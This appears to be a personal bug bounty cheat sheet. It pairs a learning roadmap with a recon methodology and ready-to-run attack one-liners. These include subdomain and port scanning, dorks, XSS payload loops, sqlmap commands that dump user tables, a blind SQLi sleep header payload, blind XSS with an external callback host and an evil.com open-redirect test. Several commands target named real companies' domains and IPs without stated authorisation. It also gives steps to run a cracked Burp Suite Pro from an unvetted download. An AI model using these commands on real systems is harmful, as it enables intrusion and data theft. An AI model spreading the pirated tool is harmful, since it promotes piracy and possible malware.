## Recon

Firstly, We should focus in networking and web server fundamentals at the beginning, and have a good knowledge and understanding of different ports and protocols, different network services, OSI Layer and TCP/IP Layer, HTTP requests, HTTP request methods, HTTP responses, DNS, IPv4 and IPv6, etc.

After that, you can get started with learning web development, you don't really need to become able to develop cool-looking webpages, but you need to learn up to the point where you can solve different problems with JavaScript (you need to be really good with it) and a backend technology like PHP, Python or Node.js, and you will also need to learn a SQL and a NoSQL database technology.

With that being done, now you can start learning web security, different kind of vulnerabilities in web applications, how they exist, how to find them, plus how to fix them as an efficient web programmer. During this phase, you can also start learning about cryptography, digital forensics, reconnaissance and intelligence gathering. At this stage, if you are interested in doing bug bounty hunting, you can get started, but you need to learn more! 🙂 Also, when you are learning about web security vulnerabilities, you can also learn about REST APIs and GraphQL, and security measures in them. During your web security learning phase, I suggest you to start learning scripting and automation as well; for this, you can pick up a Shell Scripting language like Bash, and a scripting language like Python, PHP or Perl.

You can learn about different exploitation, post-exploitation, privilege escalation, etc. techniques. You can also establish a background in programming with C, C++ or Rust. When you are done with these things or when you are well-aware of all of these things, you can move on to things like reverse engineering, and later on move on to binary exploitation as well. With all of these things being done (no need to become an expert), you can choose your career pathway into web security, mobile security, binary exploitation, network security, cloud security, blockchain security, IoT security, etc. What I have said here is all a part of what things I did during my learning phase. 😊😊

In my case, I mostly learn from official documentations of different technologies, plus the research papers and different RFCs. Many online platform like W3Schools, Mozilla Developer Network (MDN), Dev.to, StackOverflow, the overall StackExchange forums, the Twitter security community, PortSwigger Web Academy, Hack The Box, TryHackMe, VulnHub, etc., and digital content (videos, resources, tools) creators like John Hammond, STÖK, Nahamsec, The Cyber Mentor, Conda, HackerSploit, LiveOverflow, Hakluke, TomNomNom, ProjectDiscovery, EdOverflow, NetworkChuck, Codingo, Reconless, Samy Kamkar, etc.


## methodology  :-

1. Get company profile
2. Search ASNs and domain info
3. Get Ip ranges from ASNs
4. Reverse lookup ips to find subdomians
5. Subdomians enumeration
6. Ip port and services scanning
7. Filter out live subdomians
8. Manually check all the live subdomians
9. Find out the tech stack used to build the application, find versions search exploits
10. Use gau and waybackurls to crawl for urls and endpoints
11. Use grep to filter out required information from the crawled urls
12. Get js files from crawleed txt files and save it to new file and scan js files for data exposure
13. Use gau+waybackurls --> gf tool to filter xss params --> dalfox for XSS scanning
14. Google dorking
15. Github dorking
16. Shodan dorking
17. Censys search


## Modules & Tools  :-

- subfinder

subfinder -dL domains.txt -o subfinder.txt

subfinder -d [inholland.nl](http://inholland.nl/) -o subfinder.txt

- amass

go install -v [github.com/OWASP/Amass/v3/](http://github.com/OWASP/Amass/v3/)...@master

amass enum -passive -norecursive -noalts -df domains.txt -o amass.txt

- crtfinder

python3 [crtfinder.py](http://crtfinder.py/) -u [alloyhome.com](http://alloyhome.com/)

- sublist3r

sublist3r -d [safesavings.com](http://safesavings.com/) -o sublist3r.txt

- site:*.ibm.com -site:www.ibm.com

# Merging subdomains into one file :- all-subs.txt

cat amass.txt subfinder.txt gobuster_subs.txt other.txt | anew all-subs.txt

- cat all-subs.txt | httpx -o live-subs.txt
- cat live-subs.txt | dirsearch --stdin
- also ffuf :-

ffuf -u https://www.workramp.com/FUZZ -w wordlist.txt -mc 200,403,301,302 -c true -v -o output.txt

---

## Subdomain Takeover :-

1- Recon (live-subs.txt)

2- Testing :-

1- Nuclei :-

- nuclei -t /root/nuclei-templates/takeovers/ -l live-subs.txt

2- Subzy :-  https://github.com/LukaSikic/subzy

- subzy run --targets live-subs.txt
- subzy run --target [test.google.com](http://test.google.com/)
- subzy run --target [test.google.com](http://test.google.com/),[https://test.yahoo.com](https://test.yahoo.com/)

---

## virtual Host scanner :-

- git clone https://github.com/jobertabma/virtual-host-discovery.git
- ruby scan.rb --ip=151.101.194.133 --host=[cisco.com](http://cisco.com/)

---

## JS Hunting :-

1- ﻿echo [target.com](http://target.com/) | gau | grep ".js" | httpx -content-type | grep 'application/javascript'" | awk '{print $1}' | nuclei -t /root/nuclei-templates/exposures/ -silent > secrets.txt

2- echo [uber.com](http://uber.com/) | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'

3- JSS-Scanner :-

- echo "[invisionapp.com](http://invisionapp.com/)" | waybackurls | grep -iE '\.js'|grep -ivE '\.json'|sort -u > j.txt
- python3 [JSScanner.py](http://jsscanner.py/)

---

## Shodan Dorking :-

- [ssl.cert.subject.CN](http://ssl.cert.subject.cn/):"[gevme.com](http://gevme.com/)" 200
- [ssl.cert.subject.CN](http://ssl.cert.subject.cn/):"*.target.com" "230 login successful" port:"21"
- [ssl.cert.subject.CN](http://ssl.cert.subject.cn/):"*.target.com"+200 http.title:"Admin"
- Set-Cookie:"mongo-express=" "200 OK"
- ssl:"[invisionapp.com](http://invisionapp.com/)" http.title:"index of / "
- ssl:"[arubanetworks.com](http://arubanetworks.com/)" 200 http.title:"dashboard"
- net:192.168.43/24, 192.168.40/24
- AEM Login panel :- git clone https://github.com/0ang3el/aem-hacker.git

User:anonymous
Pass:anonymous

## Collect all interisting ips from Shodan and save them in ips.txt

- cat ips.txt | httpx > live-ips.txt
- cat live_ips.txt | dirsearch --stdin

---

## Google dorking :-

- site:*.gapinc.com inurl:”*admin | login” | inurl:.php | .asp
- intext:"index of /.git"
- site:*.*.edu intext:"sql syntax near" | intext:"syntax error has occurred" | intext:"incorrect syntax near" | intext:"unexpected end of SQL command" | intext:"Warning: mysql_connect()" | intext:"Warning: mysql_query()" | intext:"Warning: pg_connect()"
- site:*.mil link:www.facebook.com | link:www.instagram.com | link:www.twitter.com | link:www.youtube.com | link:www.telegram.com |
link:www.hackerone.com | link:www.slack.com | link:www.github.com
- inurl:/geoserver/web/ (intext:2.21.4 | intext:2.22.2)
- inurl:/geoserver/ows?service=wfs

---

## Github Dorking on live-subs.txt :-

- git-Grabber :-
- python3 [gitGraber.py](http://gitgraber.py/) -k wordlists/keywords.txt -q "yahoo" -s
- python3 [gitGraber.py](http://gitgraber.py/) -k wordlists/keywords.txt -q \"[yahoo.com](http://yahoo.com/)\" -s
- python3 [gitGraber.py](http://gitgraber.py/) -k keywordsfile.txt -q \"[yahoo.com](http://yahoo.com/)\" -s -w mywordlist.txt
- GitHound

---

## Check-list :- Manual Hunting inside websites for :-

1- CSRF
2- IDORS
3- Bussiness Logic Vulnerbilities
4- API bugs
5- SQLi
6- XSS

---

## XSS :-

- Paramspider :-
- python3 [paramspider.py](http://paramspider.py/) --domain [indrive.com](http://indrive.com/)
- python3 [paramspider.py](http://paramspider.py/) --domain [https://cpcalendars.cartscity.com](https://cpcalendars.cartscity.com/) --exclude woff,css,js,png,svg,php,jpg --output g.txt
- cat indrive.txt | kxss ( looking for reflected :- "<> )

## Looking for Hidden parameters :-

- Arjun :-
- arjun -u https://44.75.33.22wms/wms.login -w burp-parameter-names.txt
- waybackurls [youneedabudget.com](http://youneedabudget.com/) | gf xss | grep '=' | qsreplace '"><script>confirm(1)</script>' | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n";done
- dalfox url https://access.epam.com/auth/realms/plusx/protocol/openid-connect/auth?response_type=code -b [https://hahwul.xss.ht](https://hahwul.xss.ht/)
- dalfox file urls.txt -b [https://hahwul.xss.ht](https://hahwul.xss.ht/)
- echo "https://target.com/some.php?first=hello&last=world" | Gxss -c 100
- cat urls.txt | Gxss -c 100 -p XssReflected

---

## Sql Injection :-

- echo [https://www.recreation.gov](https://www.recreation.gov/) | waybackurls | grep "\?" | uro | httpx -silent > param.txt
- cat subdomains.txt | waybackurls | grep "\?" | uro | httpx -silent > param.txt
- sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
- sqlmap -u https://my.easyname.at/en/login --dbs --forms --crawl=2

## SQLi One Linear :-

- cat [target.com](http://target.com/) | waybackurls | grep "\?" | uro | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt
- subfinder -dL domains.txt | dnsx | waybackurls | uro | grep "\?" | head -20 | httpx -silent > urls;sqlmap -m urls --batch --random-agent --level 1 | tee sqlmap.txt

## Dump-Data :-

- sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --dbs (Databases)
- sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --tables -D acuart (Dump DB tables )
- sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --columns -T users (Dump Table Columns )
- sqlmap -u http://testphp.vulnweb.com/AJAX/infocateg.php?id=1 --dump -D acuart -T users

---

## SSTI :-

FOR Testing SSTI and tplmap tool :-

- git clone https://github.com/epinna/tplmap.git
- ./tplmap.py -u "[domain.com/?parameter=SSTI*](http://domain.com/?parameter=SSTI*)"

---

- httpx -l live_subs.txt --status-code --title -mc 200 -path /phpinfo.php
- httpx -l live_subs.txt --status-code --title -mc 200 -path /composer.json

---

######## Testing for xss and sqli at the same time >_< ##############

- cat subdomains.txt | waybackurls | uro | grep "\?" | httpx -silent > param.txt
- sqlmap -m param.txt --batch --random-agent --level 1 | tee sqlmap.txt
- cat param.txt | kxss

---

## Blind SQL Injection :-

Tips : X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z

## Blind XSS :-

site:opsgenie.com inurl:"contact" | inurl:"contact-us" | inurl:"contactus" | inurl:"contcat_us" | inurl:"contact_form" | inurl:"contact-form"

## Go to xss.report website and create an account to test for blind xss Vulnerbilitites

---

## Hunting For Cors Misconfigration :-

https://github.com/chenjj/CORScanner

pip install corscanner

corscanner -i live_subdomains.txt -v -t 100

---

https://github.com/Tanmay-N/CORS-Scanner

go install [github.com/Tanmay-N/CORS-Scanner@latest](http://github.com/Tanmay-N/CORS-Scanner@latest)

cat CORS-domain.txt | CORS-Scanner

---

## Nmap Scanning :-

#- nmap -sS -p- 192.168.1.4  (-sS) Avoid Firewell && Connection Log.

#- nmap -sS -p- -iL hosts.txt

#- nmap -Pn -sS -A -sV -sC -p 17,80,20,21,22,23,24,25,53,69,80,123,443,1723,4343,8081,8082,8088,53,161,177,3306,8888,27017,27018,139,137,445,8080,8443 -iL liveips.txt -oN scan-result.txt

#- nmap -Pn -A -sV -sC 67.20.129.216 -p 17,80,20,21,22,23,24,25,53,69,80,123,443,1723,4343,8081,8082,8088,53,161,177,3306,8888,27017,27018,139,137,445,8080,8443 -oN scan-result.txt --script=vuln

#- nmap -sT -p- 192.168.1.4    (Full Scan (TCP)).

#- nmap -sT -p- 192.168.1.5 --script=banner (Services Fingerprinting).

#- nmap -sV 192.168.1.4 (Services Fingerprinting).

#- nmap 192.168.1.5 -O   (OS Fingerprinting).

#- nmap 192.168.1.0-255 -sn  (-sn) Live Hosts with me in network.

#- nmap -iL hosts.txt -sn

#- nc -nvz 192.168.1.4 1-65535  (Port Scanning Using nc).

#- nc -vn 34.66.209.2 22        (Services Fingerprinting).

#- netdiscover     (Devices On Network) (Layer2).

#- netdiscover -r 192.168.2.0/24  (Range).

#- netdiscover -p        (Passive).

#- netdiscover -l hosts.txt

---

## Running Nuclei :-

Scanning target domain with community-curated nuclei templates :-

- nuclei -u [https://example.com](https://example.com/)
- nuclei -list urls.txt -t /fuzzing-templates
- nuclei -list live-subs.txt -t /root/nuclei-templates/vulnerabilities -t /root/nuclei-templates/cves -t /root/nuclei-templates/exposures -t /root/nuclei-templates/sqli.yaml
- nuclei -u [https://example.com](https://example.com/) -w workflows/

---

## Open Redirect:-

Open Redirection OneLiner :-

- waybackurls [tesorion.nl](http://tesorion.nl/) | grep -a -i \=http | qsreplace '[evil.com](http://evil.com/)' | while read host do;do curl -s -L $host -I| grep "[evil.com](http://evil.com/)" && echo "$host \033[0;31mVulnerable\n" ;done
- httpx -l i.txt -path "///evil.com" -status-code -mc 302

---

## Resources And Tools :-

https://github.com/orwagodfather/x

https://github.com/SAPT01/HBSQLI

python3 [hbsqli.py](http://hbsqli.py/) -l y.txt -p payloads.txt -H headers.txt -v

python3 [hbsqli.py](http://hbsqli.py/) -u "[https://target.com](https://target.com/)" -p payloads.txt -H headers.txt -v

https://github.com/thecybertix/One-Liner-Collections

https://github.com/projectdiscovery/fuzzing-templates

https://github.com/0xKayala/NucleiFuzzer

https://wpscan.com/vulnerability/825eccf9-f351-4a5b-b238-9969141b94fa

---

####### 📌 Complete Bug Bounty tool List 📌

dnscan https://github.com/rbsec/dnscan

Knockpy https://github.com/guelfoweb/knock

Sublist3r https://github.com/aboul3la/Sublist3r

massdns https://github.com/blechschmidt/massdns

nmap [https://nmap.org](https://nmap.org/)

masscan https://github.com/robertdavidgraham/masscan

EyeWitness https://github.com/ChrisTruncer/EyeWitness

DirBuster https://sourceforge.net/projects/dirbuster/

dirsearch https://github.com/maurosoria/dirsearch

Gitrob https://github.com/michenriksen/gitrob

git-secrets https://github.com/awslabs/git-secrets

sandcastle https://github.com/yasinS/sandcastle

bucket_finder https://digi.ninja/projects/bucket_finder.php

GoogD0rker https://github.com/ZephrFish/GoogD0rker/

Wayback Machine [https://web.archive.org](https://web.archive.org/)

waybackurls https://gist.github.com/mhmdiaa/adf6bff70142e5091792841d4b372050 Sn1per https://github.com/1N3/Sn1per/

XRay https://github.com/evilsocket/xray

wfuzz https://github.com/xmendez/wfuzz/

patator https://github.com/lanjelot/patator

datasploit https://github.com/DataSploit/datasploit

hydra https://github.com/vanhauser-thc/thc-hydra

changeme https://github.com/ztgrace/changeme

MobSF https://github.com/MobSF/Mobile-Security-Framework-MobSF/ Apktool https://github.com/iBotPeaches/Apktool

dex2jar https://sourceforge.net/projects/dex2jar/

sqlmap http://sqlmap.org/

oxml_xxe https://github.com/BuffaloWill/oxml_xxe/ @cyb3rhunt3r

XXE Injector https://github.com/enjoiz/XXEinjector

The JSON Web Token Toolkit https://github.com/ticarpi/jwt_tool

ground-control https://github.com/jobertabma/ground-control

ssrfDetector https://github.com/JacobReynolds/ssrfDetector

LFISuit https://github.com/D35m0nd142/LFISuite

GitTools https://github.com/internetwache/GitTools

dvcs-ripper https://github.com/kost/dvcs-ripper

tko-subs https://github.com/anshumanbh/tko-subs

HostileSubBruteforcer https://github.com/nahamsec/HostileSubBruteforcer Race the Web https://github.com/insp3ctre/race-the-web

ysoserial https://github.com/GoSecure/ysoserial

PHPGGC https://github.com/ambionics/phpggc

CORStest https://github.com/RUB-NDS/CORStest

retire-js https://github.com/RetireJS/retire.js

getsploit https://github.com/vulnersCom/getsploit

Findsploit https://github.com/1N3/Findsploit

bfac https://github.com/mazen160/bfac

WPScan https://wpscan.org/

CMSMap https://github.com/Dionach/CMSmap

Amass https://github.com/OWASP/Amass

Find all subdomains, even ones that aren't active.
Always scan all ports

##Tools to get set up:

  (https://github.com/pry0cc/axiom) axiom for different scanning tools with ease, including nmap, ffuf, masscan, nuclei, meg and many more

  Some Used Command using Axiom & Digital Ocean:
  
axiom-rm 'name\*' -f
axiom-fleet ram -i 2

axiom-rm "jarvis*" -f

axiom-scan <filename/domain> -m nuclei -ef info

axiom-scan nab-i.txt -m subfinder -o nab-o.txt


scp -r root@167.71.222.183:works ~/Desktop/

scp -r ~/Desktop/works root@167.71.222.183:~/



##Other Tools for scanner, pentesters, exploit etc: 

https://drive.google.com/drive/folders/16Sj33zrlXppGxCX6ej2Ryrxj05AAZ-G2?usp=drive_link

1. unzip it
2. navigate to main folder > "Burp Suite Professional Edition v2024.2.1.3 x64 Full Activated + Extensions - www.dr-farfar.com"
3. inside you will see a folder "Burp Suite Professional Edition" navigate into it
4. run Dr-FarFar.jar >>   java -jr Dr-FarFar.jar


### Methodology	
 
1. Gather information about the target, including Acquisitions
	-www.crunchbase.com (Find Acquisitions)

2. Identify ASNs
	-Manual: http://bgp.he.net
	- Automated:
		-Metabigor
		-ASNLookup
		-amass intel -asn [ASN NUMBER]

3. Find seeds/root domains
	-Reverse WHOIS (Automation - DOMLink)
	-Ad/Analytics Relationships (builtwith.com -> Relationships)
	-Google Dorks
	-Shodan

4. Find subdomains (**MY FRAMEWORK BEGINS HERE**)

	a. Linked and JS Discovery (finding all links included in the client-side code of an application)
		
		-W/ Burp Suite Pro:
			1. Turn off passive scanning
   
	b. Subdomain Scraping (scrape domain information from various sources to identify URLs or domains stored in their database)
		-Infrastructure Sources (Censys, DnsDumpster, WaybackMachine)
		-Certificate Sources (crt.sh, CertDB, Cert Spotter)
		-Search Sources (Google, Yahoo, Baidu)
		-Security Sources (Virus Total, Rapid7 Project Sonar, SecurityTrails)

		-Tools - Amass and Subfinder
		(Amass returns ASN numbers.  If these are new, go back to step 2 and start over)
		-github-search -> github-subdomains.py (run 5 times, 4 w/ 6 second sleep and 1 w/ 10 second sleep)
		-shosubgo (Shodan parser)
		-Cloud Ranges - A highly valuable technique is to monitor whole could ranges of AWS, GCP, and Azure for SSL sites and parse their certificates to match your target (Check port 443) (Article by Daehee Park, Defcon Talk by Sam Erb - tls.bufferover.run/dns?q=[SEARCH_TERM])
		
	c. Subdomain Bruteforcing (brute force to find live subdomains)
		-amass enum -brute -d [DOMAIN] -rf
		-shuffleDNS (wrapper around massDNS)
		-Wordlists:
			a. Tailored Wordlists
				-TomNomNom
				-Cewl
			b. Massive Wordlists
				-all.txt (JHaddix)
		-https://github.com/assetnote/commonspeak2
		-Subdomain Alterations (www.target.com -> ww2.target.com)

6. Port Analysis

	-masscan (Quick tool to identify open ports) (needs IP list!) (https://danielmiessler.com/study/masscan/)
	-dnmasscan (Wrapper that resolves domain name and passes the IP to masscan)
	-nmap (Deep dive on open ports discovered)
	-Brutespray (Checks for default creds)

7. Github Dorking (While subdomain automation is running)

-Find endpoints and subdomains
-Make custom wordlists for each target based on technologies discovered 
-Most orgs use similar directory structures on their sites.  If a disabled subdomain is found on GitHub, build wordlists using these directories
-Naming conventions and patterns are very important!
-Use job postings to identify technology stack
-After searching, check "Languages for scripting languages"
	-search by langauge (EX: language:python language:bash)
-Check for recently submitted repos
-Make sure the repo is related to their company
-Remove unnecessary results with NOT keyword (EX: "teslamotors" NOT owner-api.teslamotors.com)
-Identify users that work at the organization but are not listed under the Org's main repo (look for them on Linkedin to comfirm)
-Find users that work for org but aren't listed with these searches:
	-"[ORG]" dotfiles
-For manual, finding users who are not mapped to the organization is most important!

7. Httprobe -> Eyewitness
		
8. Subdomain Takeover
	-EdOverflow/can-i-take-over-xyz (Database of Definitions for SDT)
	-SubOver 
	-nuclei
